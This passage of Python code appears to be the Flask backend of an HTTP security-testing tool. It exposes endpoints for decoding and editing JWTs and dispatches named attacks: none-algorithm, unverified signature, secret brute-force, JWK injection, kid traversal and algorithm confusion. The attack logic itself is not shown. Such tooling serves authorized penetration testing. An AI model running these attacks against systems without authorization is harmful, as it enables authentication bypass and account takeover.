                        'total_files': total_files,
                        'total_files_checked': len(checked_files),
                        'files_found': len(found_files),
                        'checked_files': checked_files,
                        'found_files': found_files
                    }) + '\n'

        return Response(generate(), mimetype='text/event-stream')

    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/search_wayback', methods=['POST'])
def search_wayback():
    data = request.get_json()
    def generate():
        for chunk in http_tool.third_party_analysis.search_wayback_machine(data.get('url', '')):
            yield (json.dumps(chunk) + '\n').encode('utf-8')
    return Response(generate(), mimetype='application/json')

@app.route('/find_jwt', methods=['POST'])
def find_jwt():
    data = request.get_json()
    tokens = http_tool.jwt_attacks.find_jwt(data.get('request_text', ''))
    return jsonify({"tokens": tokens})

@app.route('/decode_jwt', methods=['POST'])
def decode_jwt():
    data = request.get_json()
    decoded = http_tool.jwt_attacks.decode_jwt(data.get('token', ''))
    return jsonify({"decoded": decoded})

@app.route('/edit_jwt', methods=['POST'])
def edit_jwt():
    data = request.get_json()
    result = http_tool.jwt_attacks.edit_jwt(
        data.get('decoded_text', ''),
        data.get('use_secret', False),
        data.get('secret', '')
    )
    return jsonify(result)

@app.route('/jwt_attack/<attack_type>', methods=['POST'])
def jwt_attack(attack_type):
    data = request.get_json()
    token = data.get('token', '')
    request_text = data.get('request_text', '')
    use_proxy = data.get('use_proxy', False)
    proxy_address = data.get('proxy_address')
    verify = data.get('verify', True)

    if attack_type == 'unverified_sig':
        result = http_tool.jwt_attacks.unverified_signature_attack(
            token, request_text, use_proxy, proxy_address, verify
        )
    elif attack_type == 'none_sig':
        result = http_tool.jwt_attacks.none_signature_attack(
            token, request_text, use_proxy, proxy_address, verify
        )
    elif attack_type == 'brute_force':
        result = http_tool.jwt_attacks.brute_force_secret(token)
    elif attack_type == 'jwk_injection':
        result = http_tool.jwt_attacks.jwk_header_injection(token)
    elif attack_type == 'kid_traversal':
        result = http_tool.jwt_attacks.kid_header_traversal(token, request_text, use_proxy, proxy_address, verify)
    elif attack_type == 'algorithm_confusion':
        result = http_tool.jwt_attacks.algorithm_confusion(token)
    else:
        return jsonify({"error": f"Unknown attack type: {attack_type}"})

    return jsonify(result)

@app.route('/analyze_headers', methods=['POST'])
def analyze_headers():
    data = request.get_json()
    return jsonify(http_tool.analyze_headers(data.get('request_text', '')))

if __name__ == '__main__':
    app.run()
